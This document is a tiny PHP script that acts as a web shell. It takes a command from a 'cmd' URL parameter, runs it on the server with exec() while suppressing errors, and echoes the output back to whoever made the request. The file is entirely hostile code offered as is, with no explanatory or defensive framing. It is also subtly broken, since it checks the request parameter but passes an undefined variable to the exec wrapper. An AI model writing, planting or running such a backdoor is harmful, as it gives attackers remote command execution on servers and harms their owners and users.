<?php
function ekse($cmd){
	@exec($cmd,$results);
	$buff = "";
	foreach($results as $result){
		$buff .= $result;
	}
	return $buff;
}

if(isset($_GET['cmd'])){
	$result = ekse($cmd);
	echo $result;
}
	
?>